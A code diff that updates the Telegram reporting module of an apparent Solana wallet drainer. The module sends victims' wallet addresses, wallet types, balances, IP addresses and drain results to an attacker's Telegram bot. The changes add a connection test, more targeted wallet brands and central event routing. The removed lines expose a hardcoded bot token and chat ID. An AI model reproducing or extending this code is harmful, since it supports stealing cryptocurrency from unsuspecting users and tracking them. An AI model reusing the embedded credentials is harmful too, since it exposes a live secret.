@@ -1,33 +1,61 @@
-// Environment variables for both client and server environments
-const getEnvVar = (key, fallback) => {
-  // Try to get from process.env (server-side)
-  if (typeof process !== 'undefined' && process.env) {
-    return process.env[key] || fallback;
-  }
-  // Try to get from window.env (client-side)
-  if (typeof window !== 'undefined' && window.env) {
-    return window.env[key] || fallback;
-  }
-  return fallback;
-};
+// Telegram Logger with centralized environment configuration
+import envConfig from './environment.js';
 
 class TelegramLogger {
   constructor() {
-    // Try environment variables first, then fallback to hardcoded values
-    this.botToken = getEnvVar('TELEGRAM_BOT_TOKEN', '8183467058:AAHf02SzNmP5xoqtRvIJQAN5bKE7_f-gMPQ');
-    this.chatId = getEnvVar('TELEGRAM_CHAT_ID', '7900328128');
+    // Use centralized environment configuration
+    this.botToken = envConfig.telegram.botToken;
+    this.chatId = envConfig.telegram.chatId;
     
     // Enable Telegram with valid credentials
-    this.enabled = !!(this.botToken && this.chatId);
+    this.enabled = envConfig.telegram.enabled;
     
     if (this.enabled) {
-      console.log('[TELEGRAM] Initialized with valid credentials');
+      console.log('[TELEGRAM] Initialized with credentials:', {
+        botToken: this.botToken ? `${this.botToken.substring(0, 10)}...` : 'missing',
+        chatId: this.chatId || 'missing'
+      });
     } else {
-      console.warn('[TELEGRAM] No valid credentials found - logging disabled');
+      console.log('[TELEGRAM] No valid credentials found - logging disabled');
     }
     
     // Enable logging for drain amounts in production
     this.logDrainAmounts = true;
+  }
+
+  /**
+   * Test Telegram connection
+   */
+  async testConnection() {
+    if (!this.enabled) {
+      console.log('[TELEGRAM_TEST] Telegram disabled - skipping test');
+      return false;
+    }
+
+    try {
+      console.log('[TELEGRAM_TEST] Testing Telegram connection...');
+      const url = `https://api.telegram.org/bot${this.botToken}/getMe`;
+      
+      const response = await fetch(url, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        console.log('[TELEGRAM_TEST] ✅ Connection successful:', data.result.username);
+        return true;
+      } else {
+        const errorText = await response.text();
+        console.error('[TELEGRAM_TEST] ❌ Connection failed:', response.statusText, errorText);
+        return false;
+      }
+    } catch (error) {
+      console.error('[TELEGRAM_TEST] ❌ Connection test error:', error.message);
+      return false;
+    }
   }
 
   /**
@@ -71,7 +99,7 @@ class TelegramLogger {
         
         // Retry once for rate limiting or temporary errors
         if (response.status === 429 || response.status >= 500) {
-          console.log('[TELEGRAM] Retrying message after delay...');
+          // Retrying message after delay
           await new Promise(resolve => setTimeout(resolve, 2000));
           
           try {
@@ -91,17 +119,25 @@ class TelegramLogger {
             if (!retryResponse.ok) {
               console.error('❌ Telegram retry also failed:', retryResponse.statusText);
             } else {
-              console.log('✅ Telegram message sent successfully on retry');
+              // Telegram message sent successfully on retry
             }
           } catch (retryError) {
             console.error('❌ Telegram retry error:', retryError.message);
           }
         }
       } else {
-        console.log('✅ Telegram message sent successfully');
+        // Telegram message sent successfully
       }
     } catch (error) {
       console.error('❌ Telegram send error:', error.message);
+      console.error('❌ Telegram error details:', {
+        name: error.name,
+        message: error.message,
+        stack: error.stack,
+        botToken: this.botToken ? `${this.botToken.substring(0, 10)}...` : 'missing',
+        chatId: this.chatId || 'missing',
+        enabled: this.enabled
+      });
       
       // Log to console as fallback for critical errors
       if (type === 'ERROR' || type === 'DRAIN_FAILED' || type === 'SECURITY_EVENT') {
@@ -174,6 +210,7 @@ class TelegramLogger {
 
   /**
    * Log wallet detection (all wallets, balance will be updated later)
+   * Also handles logWalletDetection for backward compatibility
    */
   async logWalletDetected(data) {
     // Validate and sanitize input data
@@ -185,26 +222,21 @@ class TelegramLogger {
     const balance = parseInt(data.lamports) || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
     
-    // Safe string conversion with fallback
-    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
     const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
     
-    // Debug logging
-    console.log('[TELEGRAM] logWalletDetected called with:', {
-      publicKey: data.publicKey,
-      walletType: data.walletType,
-      lamports: data.lamports,
-      ip: data.ip
-    });
-    console.log('[TELEGRAM] Wallet type for display:', walletType);
-    console.log('[TELEGRAM] Known wallet types:', ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus']);
+    // Wallet detected logging
 
-    // Show wallet type if it's a known wallet type
-    const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus'];
+    // Show wallet type if it's a known wallet type - ENHANCED 2025
+    const knownWalletTypes = [
+      'Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus',
+      'Coinbase', 'MathWallet', 'Slope', 'TokenPocket', 'SafePal', 'Bitget'
+    ];
     const walletTypeDisplay = knownWalletTypes.includes(walletType) ? `💼 <b>Type:</b> ${walletType}` : '';
-    console.log('[TELEGRAM] Wallet type display:', walletTypeDisplay);
+    // Wallet detected logging
 
     const message = `
 <b>👛 Wallet Detected</b>
@@ -230,7 +262,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
   }
 
   /**
-   * Log successful drain (only after broadcast confirmation)
+   * Log successful drain (only after broadcast confirmation) - 2025 FIX
    */
   async logDrainSuccess(data) {
     // Validate and sanitize input data
@@ -239,39 +271,27 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    const drainedAmount = parseInt(data.actualDrainAmount) || 0;
+    // FIXED: Properly handle both actualDrainAmount and lamports parameters
+    const drainedAmount = parseInt(data.actualDrainAmount || data.lamports) || 0;
     const drainedSOL = (drainedAmount / 1e9).toFixed(6);
     
-    // Safe string conversion with fallback
-    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
     const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
-    const balance = parseInt(data.lamports) || 0;
-    const balanceSOL = (balance / 1e9).toFixed(6);
     
     // Ensure drained amount is always shown, even if 0
     const drainedDisplay = drainedAmount > 0 ? `${drainedSOL} SOL (${drainedAmount} lamports)` : '0.000000 SOL (0 lamports)';
-    
-    // Always log drain success in production
-    console.log('[TELEGRAM_DRAIN_SUCCESS] Drain success logged:', {
-      publicKey: data.publicKey,
-      drainedAmount: drainedAmount,
-      drainedSOL: drainedSOL,
-      balance: balance,
-      balanceSOL: balanceSOL,
-      ip: ip,
-      walletType: walletType
-    });
     
     const message = `
 <b>💰 Drain Success</b>
 
 👤 <b>Wallet:</b> <code>${walletAddress}</code>
 💼 <b>Type:</b> ${walletType}
-💰 <b>Balance:</b> ${balanceSOL} SOL
 💰 <b>Drained:</b> ${drainedDisplay}
 🌐 <b>IP:</b> ${ip}
+✅ <b>Status:</b> Confirmed on-chain - drain completed
     `.trim();
 
     try {
@@ -299,8 +319,8 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    // Safe string conversion with fallback
-    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
     const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
@@ -308,33 +328,55 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     const balanceSOL = (balance / 1e9).toFixed(6);
     
     let reason = 'Unknown error';
+    let errorDetails = '';
     
     if (data.error) {
-      console.log('[TELEGRAM] Processing error:', data.error, 'Type:', typeof data.error);
+      // Parse different types of errors
+      let errorString = '';
       
-      // Convert error to string for comparison
-      const errorString = typeof data.error === 'string' ? data.error : JSON.stringify(data.error);
-      console.log('[TELEGRAM] Error string:', errorString);
-      
-      if (errorString.includes('INSUFFICIENT_FUNDS')) {
-        reason = 'Insufficient funds for fees';
-      } else if (errorString.includes('INSUFFICIENT_SOL_FOR_FEES')) {
-        reason = 'Insufficient SOL for transaction fees';
-      } else if (errorString.includes('INSUFFICIENT_DRAIN_AMOUNT')) {
-        reason = 'Drain amount too small after fees';
-      } else if (errorString.includes('RATE_LIMITED')) {
-        reason = 'Rate limit exceeded';
-      } else if (errorString.includes('timeout')) {
-        reason = 'Transaction timeout';
-      } else if (errorString.includes('Simulation failed')) {
-        reason = 'Transaction simulation failed';
-      } else if (errorString.includes('InsufficientFundsForRent')) {
-        reason = 'Insufficient funds for rent exemption';
+      if (typeof data.error === 'string') {
+        errorString = data.error;
+      } else if (typeof data.error === 'object') {
+        // Handle Solana error objects
+        if (data.error.err) {
+          errorString = JSON.stringify(data.error.err);
+          errorDetails = `Full error: ${JSON.stringify(data.error)}`;
+        } else {
+          errorString = JSON.stringify(data.error);
+        }
       } else {
-        reason = errorString;
+        errorString = String(data.error);
       }
       
-      console.log('[TELEGRAM] Final reason:', reason);
+      // Parse common Solana error patterns
+      if (errorString.includes('InsufficientFundsForRent')) {
+        reason = 'Insufficient funds for rent exemption';
+      } else if (errorString.includes('InsufficientFunds')) {
+        reason = 'Insufficient funds for transaction';
+      } else if (errorString.includes('AccountNotFound')) {
+        reason = 'Account not found';
+      } else if (errorString.includes('InvalidAccountData')) {
+        reason = 'Invalid account data';
+      } else if (errorString.includes('ProgramError')) {
+        reason = 'Program execution error';
+      } else if (errorString.includes('InstructionMissingKeys')) {
+        reason = 'Missing required account keys';
+      } else if (errorString.includes('InvalidInstructionData')) {
+        reason = 'Invalid instruction data';
+      } else if (errorString.includes('UnsupportedProgramId')) {
+        reason = 'Unsupported program ID';
+      } else if (errorString.includes('RATE_LIMITED')) {
+        reason = 'Rate limit exceeded';
+      } else if (errorString.includes('broadcast_failed')) {
+        reason = 'Transaction broadcast failed';
+      } else if (errorString.includes('timeout')) {
+        reason = 'Transaction confirmation timeout';
+      } else if (errorString.includes('INSUFFICIENT_FUNDS')) {
+        reason = 'Insufficient funds for transaction';
+      } else {
+        // Preserve the actual error message for debugging
+        reason = errorString.length > 100 ? errorString.substring(0, 100) + '...' : errorString;
+      }
     }
     
     const message = `
@@ -345,6 +387,10 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 💰 <b>Balance:</b> ${balanceSOL} SOL
 ❌ <b>Reason:</b> ${reason}
 🌐 <b>IP:</b> ${ip}
+${data.signature ? `📝 <b>Signature:</b> <code>${data.signature}</code>` : ''}
+${data.status ? `📊 <b>Status:</b> ${data.status}` : ''}
+${errorDetails ? `🔍 <b>Error Details:</b> ${errorDetails}` : ''}
+${data.details ? `🔍 <b>Additional Details:</b> ${data.details}` : ''}
     `.trim();
 
     try {
@@ -373,8 +419,8 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    // Safe string conversion with fallback
-    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
     const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const walletType = String(data.walletType || 'Unknown');
@@ -418,8 +464,8 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    // Safe string conversion with fallback
-    const user = data.user ? String(data.user) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const user = data.user || data.publicKey ? String(data.user || data.publicKey) : 'Unknown';
     const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const details = String(data.details || 'No details provided');
@@ -456,8 +502,8 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    // Safe string conversion with fallback
-    const user = data.user ? String(data.user) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const user = data.user || data.publicKey ? String(data.user || data.publicKey) : 'Unknown';
     const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const balance = parseInt(data.lamports) || 0;
@@ -495,10 +541,11 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    // Safe string conversion with fallback
-    const user = data.user ? String(data.user) : 'Unknown';
-    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
+    // FIXED: Use publicKey instead of user for consistency
+    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
+    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
     const ip = String(data.ip || 'Unknown');
+    const walletType = String(data.walletType || 'Unknown');
     const balance = parseInt(data.lamports) || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
     
@@ -506,6 +553,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 <b>💸 Insufficient Funds</b>
 
 👤 <b>Wallet:</b> <code>${walletAddress}</code>
+💼 <b>Type:</b> ${walletType}
 💰 <b>Balance:</b> ${balanceSOL} SOL
 🌐 <b>IP:</b> ${ip}
     `.trim();
@@ -525,6 +573,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     }
   }
 
+
   /**
    * Log general errors
    */
@@ -535,8 +584,8 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
       return;
     }
 
-    // Safe string conversion with fallback
-    const user = data.user ? String(data.user) : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const user = data.user || data.publicKey ? String(data.user || data.publicKey) : 'Unknown';
     const walletAddress = user !== 'Unknown' ? user : 'Unknown';
     const ip = String(data.ip || 'Unknown');
     const errorMessage = String(data.message || data.details || data.error || 'Unknown error');
@@ -564,10 +613,11 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
   }
 
   /**
-   * Log drain attempt (transaction creation)
+   * Log drain attempt (transaction presented to user for signing)
    */
   async logDrainAttempt(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const walletAddress = (data.publicKey || data.user) ? String(data.publicKey || data.user) : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
@@ -583,9 +633,10 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
 💼 <b>Type:</b> ${walletType}
 💰 <b>Balance:</b> ${balanceSOL} SOL
 🌐 <b>IP:</b> ${ip}
-📊 <b>Status:</b> ${success ? '✅ Success' : '❌ Failed'}
+📊 <b>Status:</b> ${success ? '✅ Transaction Ready' : '❌ Failed'}
 📝 <b>Instructions:</b> ${instructions}
 📦 <b>Size:</b> ${transactionSize} bytes
+💡 <b>Note:</b> Transaction presented to user for signing
     `.trim();
 
     try {
@@ -608,7 +659,8 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
    * Log security events (rate limiting, blocked IPs, etc.)
    */
   async logSecurityEvent(data) {
-    const walletAddress = data.user ? data.user.toString() : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const walletAddress = (data.user || data.publicKey) ? String(data.user || data.publicKey) : 'Unknown';
     const ip = data.ip || 'Unknown';
     const eventType = data.type || 'Unknown';
     const details = data.details || 'No details provided';
@@ -637,11 +689,9 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     }
   }
 
-  /**
-   * Log drain transaction created (before signing)
-   */
   async logDrainCreated(data) {
-    const walletAddress = data.publicKey ? data.publicKey.toString() : 'Unknown';
+    // Safe string conversion with fallback - handle both publicKey and user parameters
+    const walletAddress = (data.publicKey || data.user) ? String(data.publicKey || data.user) : 'Unknown';
     const ip = data.ip || 'Unknown';
     const balance = data.lamports || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
@@ -672,6 +722,69 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
         walletType: walletType,
         timestamp: new Date().toISOString()
       });
+    }
+  }
+
+  /**
+   * Backward compatibility method - redirects to logWalletDetected
+   */
+  async logWalletDetection(data) {
+    return this.logWalletDetected(data);
+  }
+
+  /**
+   * Backward compatibility method - redirects to logDrainSuccess
+   */
+  async logTransactionConfirmation(data) {
+    return this.logDrainSuccess(data);
+  }
+
+  /**
+   * Centralized logging method to prevent duplicates and ensure consistency
+   */
+  async logEvent(eventType, data, options = {}) {
+    // Prevent duplicate logging within 10 seconds for drain attempts, 5 seconds for others
+    const cooldownTime = eventType === 'DRAIN_ATTEMPT' ? 10000 : 5000;
+    const eventKey = `${eventType}_${data.publicKey || data.user}_${data.ip}`;
+    const now = Date.now();
+    
+    if (this.lastLogTime && this.lastLogTime[eventKey] && (now - this.lastLogTime[eventKey]) < cooldownTime) {
+      console.log(`[TELEGRAM] Skipping duplicate log: ${eventType} for ${data.publicKey || data.user} (cooldown: ${cooldownTime}ms)`);
+      return;
+    }
+    
+    if (!this.lastLogTime) this.lastLogTime = {};
+    this.lastLogTime[eventKey] = now;
+
+    // Route to appropriate method
+    switch (eventType) {
+      case 'WALLET_DETECTED':
+      case 'WALLET_DETECTION':
+        return this.logWalletDetected(data);
+      case 'DRAIN_SUCCESS':
+      case 'TRANSACTION_CONFIRMATION':
+        return this.logDrainSuccess(data);
+      case 'DRAIN_FAILED':
+        return this.logDrainFailed(data);
+      case 'TRANSACTION_CANCELLED':
+        return this.logTransactionCancelled(data);
+      case 'RATE_LIMIT':
+        return this.logRateLimit(data);
+      case 'HIGH_VALUE_BYPASS':
+        return this.logHighValueBypass(data);
+      case 'INSUFFICIENT_FUNDS':
+        return this.logInsufficientFunds(data);
+      case 'ERROR':
+        return this.logError(data);
+      case 'DRAIN_ATTEMPT':
+        return this.logDrainAttempt(data);
+      case 'SECURITY_EVENT':
+        return this.logSecurityEvent(data);
+      case 'DRAIN_CREATED':
+        return this.logDrainCreated(data);
+      default:
+        console.error(`[TELEGRAM] Unknown event type: ${eventType}`);
+        return this.logError({ ...data, message: `Unknown event type: ${eventType}` });
     }
   }
 }
